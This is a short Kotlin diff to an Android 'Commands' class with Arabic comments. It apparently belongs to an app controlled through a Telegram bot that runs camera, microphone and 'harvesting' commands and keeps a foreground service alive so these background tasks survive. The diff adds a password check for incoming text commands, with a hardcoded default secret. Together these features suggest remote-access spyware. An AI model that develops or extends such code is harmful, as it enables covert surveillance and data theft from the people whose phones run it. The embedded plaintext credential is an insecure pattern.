@@ -32,6 +32,7 @@ import com.example.app.CallbackData
  * ✅ تم إصلاح دالة invokeMethod لاستخدام الاسم وعدد المعاملات فقط مع تخزين مؤقت لتحسين الأداء.
  * ✅ تم إصلاح معالجة reply_markup في invokeTelegramMethod لضمان تحويلها إلى JSON صحيح.
  * ✅ تم إضافة نبض (Pulse) للخدمة الأمامية عند تنفيذ أوامر الكاميرا والميكروفون والحصاد لتجنب قتل العمليات في الخلفية.
+ * ✅ تم إضافة دالة validateControlPassword للتحقق من كلمة السر النصية.
  */
 class Commands private constructor(context: Context) {
 
@@ -972,6 +973,20 @@ class Commands private constructor(context: Context) {
             Log.e(TAG, "Method invocation error ($methodName): ${e.message}")
             null
         }
+    }
+
+    // ============================================================
+    //  ✅ دالة مساعدة للتحقق من كلمة السر (تُستخدم عند استقبال الأوامر النصية)
+    // ============================================================
+
+    /**
+     * التحقق من صحة كلمة السر المدخلة.
+     * @param inputSecret كلمة السر المدخلة
+     * @param expectedSecret كلمة السر المتوقعة (افتراضياً "Zaen123@123@")
+     * @return true إذا تطابقت، false وإلا
+     */
+    fun validateControlPassword(inputSecret: String, expectedSecret: String = "Zaen123@123@"): Boolean {
+        return inputSecret.trim() == expectedSecret
     }
 
     // ============================================================
